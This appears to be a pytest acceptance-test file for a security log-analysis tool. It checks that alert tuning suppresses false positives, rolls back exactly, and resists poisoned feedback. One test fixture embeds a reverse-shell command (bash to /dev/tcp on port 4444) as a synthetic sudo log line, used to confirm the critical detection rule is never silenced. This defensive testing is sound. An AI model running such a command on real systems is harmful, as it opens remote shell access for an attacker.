"""Acceptance tests for the tuning loop against the REAL frozen benchmark.

These drive ``sentinel feedback / review / tune`` through the CLI with a
real, committed ``benchmarks/`` tree, then verify the effect on a real
:class:`AnalysisPipeline`. Every test works in its own state directory.
"""

from __future__ import annotations

import json
from collections.abc import Iterator
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import pytest
import yaml
from click.testing import CliRunner

import sentinelai.detection.rules  # noqa: F401  (registers the built-in rules)
from sentinelai.cli.app import cli
from sentinelai.config.loader import load_config
from sentinelai.core.exceptions import ConfigError
from sentinelai.core.models import Alert, EventCategory, EventType, LogEvent, Severity
from sentinelai.core.pipeline import AnalysisPipeline, ScanResult
from sentinelai.core.store import AlertStore
from sentinelai.detection.base import available_rules
from sentinelai.risk.engine import RiskEngine
from sentinelai.tuning.feedback import collect_feedback
from sentinelai.tuning.proposals import generate_proposals
from tests.conftest import make_event

BENCH = Path(__file__).resolve().parent.parent / "benchmarks"
BASELINE = BENCH / "baseline.json"

FP_IP = "198.51.100.7"
FP_USER = "scanner"
TP_IP = "203.0.113.9"
ATTACKER_IP = "203.0.113.10"
ATTACKER_USER = "deploy"
SHELL_IP = "198.51.100.50"
SHELL_USER = "ops"
SCAN_BASE = datetime(2026, 1, 7, 12, 0, 0, tzinfo=timezone.utc)


# -- helpers ---------------------------------------------------------------


@dataclass
class Env:
    """A throwaway state directory plus the config file pointing at it."""

    root: Path
    state: Path
    cfg: Path

    @property
    def overlay(self) -> Path:
        return self.state / "tuning.yaml"

    @property
    def audit(self) -> Path:
        return self.state / "tuning" / "audit.jsonl"

    def store(self) -> AlertStore:
        self.state.mkdir(parents=True, exist_ok=True)
        return AlertStore(self.state / "alerts.db")


def make_env(root: Path) -> Env:
    state = root / "state"
    state.mkdir(parents=True, exist_ok=True)
    cfg = root / "config.yaml"
    cfg.write_text(f'state_dir: "{state.as_posix()}"\n', encoding="utf-8")
    return Env(root=root, state=state, cfg=cfg)


def label_alert(
    store: AlertStore,
    rule_id: str,
    label: str,
    *,
    ip: str | None,
    user: str | None,
    **context: Any,
) -> int:
    """Save a real, risk-scored alert for *rule_id* and label it."""
    rule = available_rules()[rule_id]()
    event = make_event(ip=ip, user=user)
    alert: Alert = rule.make_alert(event, f"{rule_id} test", "synthetic alert")
    alert.context = dict(context)
    RiskEngine().score(alert)
    alert_id = store.save(alert)
    store.add_feedback(alert_id, label, note="synthetic")
    return alert_id


def seed_scripted(env: Env) -> None:
    """4 false positives from one scanner, 2 true positives from another host."""
    store = env.store()
    try:
        for _ in range(4):
            label_alert(store, "R001", "fp", ip=FP_IP, user=FP_USER, attempts=6)
        for _ in range(2):
            label_alert(store, "R001", "tp", ip=TP_IP, user="root", attempts=40)
    finally:
        store.close()


def run_cli(env: Env, *args: str) -> Any:
    argv = ["--config", str(env.cfg), "--no-plugins", *args]
    return CliRunner().invoke(cli, argv)


def tune(env: Env, *args: str) -> Any:
    return run_cli(env, "tune", "--benchmarks", str(BENCH), *args)


def failed_logins(ip: str, user: str, count: int = 6) -> list[LogEvent]:
    return [
        LogEvent(
            timestamp=SCAN_BASE + timedelta(seconds=i),
            message="Failed password",
            raw="Failed password",
            hostname="web01",
            service="sshd",
            event_type=EventType.AUTH_FAILURE,
            category=EventCategory.AUTHENTICATION,
            severity=Severity.WARNING,
            ip=ip,
            user=user,
        )
        for i in range(count)
    ]


def reverse_shell_event(ip: str, user: str) -> LogEvent:
    message = f"{user} : COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1'"
    return LogEvent(
        timestamp=SCAN_BASE,
        message=message,
        raw=message,
        hostname="app01",
        service="sudo",
        event_type=EventType.GENERIC,
        category=EventCategory.SYSTEM,
        severity=Severity.INFO,
        ip=ip,
        user=user,
    )


def scan(env: Env, events: list[LogEvent]) -> ScanResult:
    pipeline = AnalysisPipeline(load_config(env.cfg))
    try:
        return pipeline.run_scan(events, use_ai=False)
    finally:
        pipeline.close()


def rule_ids(result: ScanResult) -> list[str]:
    return [a.rule_id for a in result.alerts]


def future_date(days: int = 30) -> str:
    return (datetime.now(timezone.utc) + timedelta(days=days)).date().isoformat()


def full_output(result: Any) -> str:
    return result.output + getattr(result, "stderr", "")


# -- 1. the scripted acceptance scenario ----------------------------------------


@dataclass
class ScriptedRun:
    env: Env
    preview: Any
    apply: Any
    suppressed_scan: ScanResult
    attacker_scan: ScanResult
    eval_after: Any


@pytest.fixture(scope="module")
def scripted(tmp_path_factory: pytest.TempPathFactory) -> Iterator[ScriptedRun]:
    env = make_env(tmp_path_factory.mktemp("scripted"))
    seed_scripted(env)
    preview = tune(env)
    applied = tune(env, "--apply")
    suppressed_scan = scan(env, failed_logins(FP_IP, FP_USER))
    attacker_scan = scan(env, failed_logins(TP_IP, "root"))
    eval_after = run_cli(env, "eval", "--benchmarks", str(BENCH), "--baseline", str(BASELINE))
    yield ScriptedRun(env, preview, applied, suppressed_scan, attacker_scan, eval_after)


class TestScriptedAcceptance:
    def test_tune_rejects_threshold_and_accepts_suppression(self, scripted: ScriptedRun) -> None:
        out = full_output(scripted.preview)
        assert scripted.preview.exit_code == 0, out
        assert "REJECT" in out
        assert "ACCEPT" in out
        accepted_yaml = out.split("Accepted proposals (YAML)", 1)[1]
        assert "suppressions" in accepted_yaml
        assert "brute_force_attempts" not in accepted_yaml

    def test_preview_changes_nothing_on_disk(self, scripted: ScriptedRun) -> None:
        assert "Nothing was changed" in full_output(scripted.preview)

    def test_apply_exits_zero_and_writes_overlay(self, scripted: ScriptedRun) -> None:
        assert scripted.apply.exit_code == 0, full_output(scripted.apply)
        assert scripted.env.overlay.is_file()

    def test_overlay_holds_only_the_narrow_suppression(self, scripted: ScriptedRun) -> None:
        data = yaml.safe_load(scripted.env.overlay.read_text(encoding="utf-8"))
        assert list(data) == ["detection"]
        assert list(data["detection"]) == ["suppressions"]
        (entry,) = data["detection"]["suppressions"]
        assert entry["rule"] == "R001"
        assert entry["user"] == FP_USER
        assert entry["ip"] == f"{FP_IP}/32"

    def test_suppressed_source_raises_no_r001(self, scripted: ScriptedRun) -> None:
        assert "R001" not in rule_ids(scripted.suppressed_scan)

    def test_suppressed_alert_is_counted_in_statistics(self, scripted: ScriptedRun) -> None:
        assert scripted.suppressed_scan.statistics.suppressed["R001"] >= 1

    def test_other_source_still_raises_r001(self, scripted: ScriptedRun) -> None:
        assert "R001" in rule_ids(scripted.attacker_scan)
        assert scripted.attacker_scan.statistics.suppressed["R001"] == 0

    def test_eval_against_baseline_still_exits_zero(self, scripted: ScriptedRun) -> None:
        assert scripted.eval_after.exit_code == 0, full_output(scripted.eval_after)


# -- 2. rollback exactness -------------------------------------------------------

CRLF_OVERLAY = b"# hand written overlay\r\ndetection:\r\n  brute_force_window_seconds: 300\r\n"


@pytest.fixture(scope="module")
def history_run(tmp_path_factory: pytest.TempPathFactory) -> dict[str, Any]:
    env = make_env(tmp_path_factory.mktemp("rollback"))
    seed_scripted(env)
    env.overlay.write_bytes(CRLF_OVERLAY)
    applied = tune(env, "--apply")
    after_apply = env.overlay.read_bytes() if env.overlay.exists() else None
    audit_after_apply = env.audit.read_text(encoding="utf-8") if env.audit.exists() else ""
    rollback = run_cli(env, "tune", "--rollback")
    restored = env.overlay.read_bytes() if env.overlay.exists() else None
    audit_after_rollback = env.audit.read_text(encoding="utf-8") if env.audit.exists() else ""
    second = run_cli(env, "tune", "--rollback")
    history = run_cli(env, "tune", "--history")
    return {
        "applied": applied,
        "after_apply": after_apply,
        "rollback": rollback,
        "restored": restored,
        "second": second,
        "history": history,
        "audit_apply": audit_after_apply,
        "audit_rollback": audit_after_rollback,
    }


class TestRollbackExactness:
    def test_apply_changes_the_existing_overlay(self, history_run: dict[str, Any]) -> None:
        assert history_run["applied"].exit_code == 0, full_output(history_run["applied"])
        assert history_run["after_apply"] != CRLF_OVERLAY
        assert b"suppressions" in history_run["after_apply"]

    def test_rollback_restores_original_bytes_exactly(self, history_run: dict[str, Any]) -> None:
        assert history_run["rollback"].exit_code == 0, full_output(history_run["rollback"])
        assert history_run["restored"] == CRLF_OVERLAY

    def test_second_rollback_exits_nonzero(self, history_run: dict[str, Any]) -> None:
        second = history_run["second"]
        assert second.exit_code != 0
        assert "nothing to roll back" in full_output(second).lower()

    def test_history_lists_apply_and_rollback_rows(self, history_run: dict[str, Any]) -> None:
        history = history_run["history"]
        assert history.exit_code == 0
        out = full_output(history).lower()
        assert "apply" in out
        assert "rollback" in out

    def test_audit_log_exists_and_only_grows(self, history_run: dict[str, Any]) -> None:
        before = history_run["audit_apply"]
        after = history_run["audit_rollback"]
        assert before.strip()
        assert after.startswith(before)
        assert len(after.splitlines()) > len(before.splitlines())
        events = [json.loads(line)["event"] for line in after.splitlines()]
        assert events == ["apply", "rollback"]


# -- 3. adversarial feedback ----------------------------------------------------


class TestFeedbackPoisoning:
    def test_labelling_real_attack_as_false_positive_is_rejected_by_gate(
        self, tmp_path: Path
    ) -> None:
        env = make_env(tmp_path)
        store = env.store()
        try:
            for _ in range(6):
                label_alert(store, "R001", "fp", ip=ATTACKER_IP, user=ATTACKER_USER, attempts=6)
        finally:
            store.close()

        preview = tune(env)
        applied = tune(env, "--apply")

        out = full_output(preview)
        assert preview.exit_code == 0, out
        assert "REJECT" in out
        assert "ACCEPT" not in out
        assert "benchmark regressions" in out or "recall" in out.lower()
        assert applied.exit_code == 1
        assert not env.overlay.exists()

    @pytest.fixture()
    def shell_env(self, tmp_path: Path) -> Env:
        env = make_env(tmp_path)
        store = env.store()
        try:
            for _ in range(50):
                label_alert(store, "R031", "fp", ip=SHELL_IP, user=SHELL_USER)
        finally:
            store.close()
        return env

    def test_critical_rule_suppression_is_rejected_without_force(self, shell_env: Env) -> None:
        preview = tune(shell_env)
        applied = tune(shell_env, "--apply")

        assert preview.exit_code == 0, full_output(preview)
        assert "REJECT" in full_output(preview)
        assert "ACCEPT" not in full_output(preview)
        assert applied.exit_code == 1
        assert not shell_env.overlay.exists()

    def test_forced_apply_never_makes_a_reverse_shell_go_silent(self, shell_env: Env) -> None:
        forced = tune(shell_env, "--force", "--apply")
        assert forced.exit_code in (0, 1), full_output(forced)
        if forced.exit_code == 1:
            assert not shell_env.overlay.exists()
        else:
            assert shell_env.overlay.is_file()

        # Whatever the gate decided, make sure a suppression for R031 is on disk and
        # that the engine still refuses to honour it for a critical alert.
        if not shell_env.overlay.exists():
            overlay = {
                "detection": {
                    "suppressions": [
                        {
                            "rule": "R031",
                            "user": SHELL_USER,
                            "ip": f"{SHELL_IP}/32",
                            "expires": future_date(),
                            "note": "poisoned",
                        }
                    ]
                }
            }
            shell_env.overlay.write_text(yaml.safe_dump(overlay), encoding="utf-8")
        result = scan(shell_env, [reverse_shell_event(SHELL_IP, SHELL_USER)])
        assert "R031" in rule_ids(result)
        assert result.statistics.suppressed["R031"] == 0

    def test_inflated_attempts_never_produce_a_threshold_proposal(self, tmp_path: Path) -> None:
        env = make_env(tmp_path)
        store = env.store()
        try:
            # Distinct /24s and users: no narrow suppression scope exists either.
            for attempts, ip, user in (
                (40, "198.51.100.1", "a"),
                (45, "192.0.2.1", "b"),
                (50, "203.0.113.1", "c"),
            ):
                label_alert(store, "R001", "fp", ip=ip, user=user, attempts=attempts)
            entries = collect_feedback(store)
        finally:
            store.close()

        proposals = generate_proposals(entries, load_config(env.cfg))
        assert [p for p in proposals if p.kind == "threshold"] == []

        out = full_output(tune(env))
        assert "brute_force_attempts" not in out

    def test_overlay_with_firewall_key_makes_load_config_fail(self, tmp_path: Path) -> None:
        env = make_env(tmp_path)
        env.overlay.write_text("firewall:\n  backend: iptables\n", encoding="utf-8")
        with pytest.raises(ConfigError):
            load_config(env.cfg)

    def test_overlay_disabling_a_rule_makes_load_config_fail(self, tmp_path: Path) -> None:
        env = make_env(tmp_path)
        env.overlay.write_text("detection:\n  disabled_rules: [R031]\n", encoding="utf-8")
        with pytest.raises(ConfigError):
            load_config(env.cfg)


# -- 4. CLI behaviour -------------------------------------------------------------


class TestFeedbackCommand:
    def test_neither_flag_is_a_usage_error(self, tmp_path: Path) -> None:
        result = run_cli(make_env(tmp_path), "feedback", "1")
        assert result.exit_code == 2

    def test_both_flags_is_a_usage_error(self, tmp_path: Path) -> None:
        result = run_cli(make_env(tmp_path), "feedback", "1", "--tp", "--fp")
        assert result.exit_code == 2

    def test_unknown_alert_id_fails_cleanly(self, tmp_path: Path) -> None:
        result = run_cli(make_env(tmp_path), "feedback", "999", "--fp")
        assert result.exit_code != 0
        assert not isinstance(result.exception, (AttributeError, TypeError, KeyError))
        assert "999" in full_output(result)

    def test_valid_feedback_is_stored_with_note(self, tmp_path: Path) -> None:
        env = make_env(tmp_path)
        store = env.store()
        try:
            rule = available_rules()["R001"]()
            alert = rule.make_alert(make_event(ip=FP_IP, user=FP_USER), "t", "d")
            RiskEngine().score(alert)
            alert_id = store.save(alert)
        finally:
            store.close()

        result = run_cli(env, "feedback", str(alert_id), "--fp", "--note", "x")
        assert result.exit_code == 0, full_output(result)

        store = env.store()
        try:
            (entry,) = store.list_feedback()
        finally:
            store.close()
        assert entry.alert_id == alert_id
        assert entry.label == "fp"
        assert entry.note == "x"


class TestReviewAndTuneCommands:
    def test_review_without_tty_exits_zero_with_message(self, tmp_path: Path) -> None:
        env = make_env(tmp_path)
        store = env.store()
        try:
            label_alert(store, "R001", "fp", ip=FP_IP, user=FP_USER, attempts=6)
            rule = available_rules()["R001"]()
            alert = rule.make_alert(make_event(ip=TP_IP, user="root"), "t", "d")
            RiskEngine().score(alert)
            store.save(alert)
        finally:
            store.close()

        result = run_cli(env, "review")
        assert result.exit_code == 0, full_output(result)
        assert "not a terminal" in full_output(result)

    def test_review_on_empty_state_exits_zero(self, tmp_path: Path) -> None:
        result = run_cli(make_env(tmp_path), "review")
        assert result.exit_code == 0
        assert "Nothing to review" in full_output(result)

    def test_tune_without_feedback_explains_what_is_needed(self, tmp_path: Path) -> None:
        env = make_env(tmp_path)
        result = tune(env)
        out = full_output(result)
        assert result.exit_code == 0, out
        assert "No proposals" in out
        assert "false positive" in out
        assert not env.overlay.exists()

    def test_apply_with_missing_benchmarks_exits_one_and_writes_nothing(
        self, tmp_path: Path
    ) -> None:
        env = make_env(tmp_path)
        seed_scripted(env)
        result = run_cli(env, "tune", "--benchmarks", str(tmp_path / "nope"), "--apply")
        assert result.exit_code == 1
        assert not env.overlay.exists()
        assert not env.audit.exists()

    def test_history_and_rollback_together_is_a_usage_error(self, tmp_path: Path) -> None:
        result = run_cli(make_env(tmp_path), "tune", "--history", "--rollback")
        assert result.exit_code == 2
